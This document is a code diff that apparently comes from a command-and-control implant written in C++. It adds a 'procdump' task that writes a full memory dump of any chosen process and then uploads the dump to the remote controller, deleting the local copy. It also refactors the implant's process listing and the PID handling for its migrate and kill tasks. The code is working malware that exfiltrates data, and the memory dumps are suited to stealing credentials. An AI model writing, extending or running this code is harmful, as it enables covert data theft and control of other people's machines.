@@ -194,9 +194,7 @@ std::wstring ExecuteTaskMigrate(const std::wstring& wPid)
     // Reference:
     // https://gitbook.seguranca-informatica.pt/privilege-escalation-privesc/process-migration-like-meterpreter
 
-    std::string sPid = UTF8Encode(wPid);
-    char* pEnds;
-    DWORD dwPid = (DWORD)strtoul(sPid.c_str(), &pEnds, 10);
+    DWORD dwPid = ConvertWstringToDWORD(wPid, 10);
 
     BOOL bResult = FALSE;
 
@@ -327,73 +325,92 @@ std::wstring ExecuteTaskMv(
     return L"Success: File has been moved to the destination.";
 }
 
+std::wstring ExecuteTaskProcdump(const std::wstring& wPid)
+{
+    DWORD dwPid = ConvertWstringToDWORD(wPid, 10);
+    // std::wstring wDumpFilePath = L"tmp.dmp";
+    std::wstring wDumpFilePath = GetEnvStrings(L"%TEMP%") + L"\\tmp.dmp";
+
+    HANDLE hFile = CreateFile(
+        wDumpFilePath.c_str(),
+        GENERIC_ALL,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        return L"Error: Could not create a file to dump.";
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPid);
+    if (!hProcess)
+    {
+        CloseHandle(hFile);
+        return L"Error: Could not open process.";
+    }
+
+    if (!MiniDumpWriteDump(
+        hProcess,
+        dwPid,
+        hFile,
+        MiniDumpWithFullMemory,
+        NULL,
+        NULL,
+        NULL
+    )) {
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
+        return L"Error: Could not dump the process.";
+    }
+
+    CloseHandle(hFile);
+    CloseHandle(hProcess);
+
+    return wDumpFilePath.c_str();
+}
+
 std::wstring ExecuteTaskPs()
 {
-    DWORD aProcesses[1024], cbNeeded, cProcesses;
-    unsigned int i;
+    HANDLE hSnapshot;
+    PROCESSENTRY32W pe32;
 
     DWORD dwCurrentPid = GetCurrentProcessId();
 
-    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
     {
-        return L"Error: Could not enumerate processes.";
+        return L"Error: Could not create snapshot.";
     }
 
-    // Calculate how many process identifiers were returned.
-    cProcesses = cbNeeded / sizeof(DWORD);
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+    
+    if (!Process32FirstW(hSnapshot, &pe32))
+    {
+        CloseHandle(hSnapshot);
+        return L"Error: Could not get the first process.";
+    }
 
-    // Retrieve the list of processes.
     std::wstring wProcesses = L"";
-    for (i = 0; i < cProcesses; i++)
-    {
-        DWORD dwPid = aProcesses[i];
-        std::string sPid = std::to_string(dwPid);
-        std::wstring wPid = UTF8Decode(sPid);
 
-        if (dwPid != 0)
+    do {
+        DWORD dwPid = pe32.th32ProcessID;
+        std::wstring wPid = ConvertDWORDToWstring(dwPid);
+        std::wstring wProcessName(pe32.szExeFile);
+
+        // If the pid is current pid, prepend asterisk (*) to the line.
+        std::wstring wPrefix = L" ";
+        if (dwPid == dwCurrentPid)
         {
-            // Get the process name
-            TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
-
-            HANDLE hProcess = OpenProcess(
-                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
-                FALSE,
-                dwPid
-            );
-            if (hProcess)
-            {
-                HMODULE hMod;
-                DWORD cbNeeded;
-
-                BOOL bResult = EnumProcessModulesEx(
-                    hProcess,
-                    &hMod,
-                    sizeof(hMod),
-                    &cbNeeded,
-                    LIST_MODULES_ALL
-                );
-                if (bResult)
-                {
-                    GetModuleBaseName(
-                        hProcess,
-                        hMod,
-                        szProcessName,
-                        sizeof(szProcessName)/sizeof(TCHAR)
-                    );
-                }
-            }
-
-            // If the pid is current pid, prepend asterisk (*) to the line.
-            std::wstring wPrefix = L" ";
-            if (dwPid == dwCurrentPid)
-            {
-                wPrefix = L"*";
-            }
-
-            std::wstring wProcessName(szProcessName);
-            wProcesses += wPrefix + wPid + L"\t" + wProcessName + L"\n";
+            wPrefix = L"*";
         }
-    }
+
+        wProcesses += wPrefix + wPid + L"\t" + wProcessName + L"\n";
+    } while (Process32NextW(hSnapshot, &pe32));
+
+    CloseHandle(hSnapshot);
 
     if (wcscmp(wProcesses.c_str(), L"") == 0)
     {
@@ -409,9 +426,7 @@ std::wstring ExecuteTaskPs()
 
 std::wstring ExecuteTaskPsKill(const std::wstring& wPid)
 {
-    std::string sPid = UTF8Encode(wPid);
-    char* pEnds;
-    DWORD dwPid = (DWORD)strtoul(sPid.c_str(), &pEnds, 10);
+    DWORD dwPid = ConvertWstringToDWORD(wPid, 10);
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
     if (!hProcess)
@@ -607,6 +622,10 @@ std::wstring ExecuteTask(
 
         return ExecuteTaskMv(wSrc, wDest);
     }
+    else if (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0)
+    {
+        return ExecuteTaskProcdump(task.substr(9, task.size()));
+    }
     else if (wcscmp(task.c_str(), L"ps") == 0)
     {
         return ExecuteTaskPs();
@@ -684,14 +703,17 @@ BOOL SendTaskResult(
 	std::wstring wHeaders;
 	wHeaders = L"X-Task: " + task + L"\r\n";
 
-    // When the "screenshot" task, read bytes of the captured image file and send them.
-    if (wcscmp(task.c_str(), L"screenshot") == 0)
-    {
+    // When the "procdump" and "screenshot" tasks,
+    // read bytes of the captured image file and send them.
+    if (
+        (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0) ||
+        (wcscmp(task.c_str(), L"screenshot") == 0)
+    ) {
         // Load a captured image file
-        std::vector<char> imgData = ReadBytesFromFile(taskResult);
+        std::vector<char> fileData = ReadBytesFromFile(taskResult);
 
         // Delete the image file
-        MyDeleteFile(taskResult);
+        DeleteFile(taskResult.c_str());
 
         resp = SendRequest(
             hConnect,
@@ -700,8 +722,8 @@ BOOL SendTaskResult(
             lpPath,
             L"POST",
             wHeaders.c_str(),
-            (LPVOID)imgData.data(),
-            (DWORD)imgData.size()
+            (LPVOID)fileData.data(),
+            (DWORD)fileData.size()
         );
     }
     else
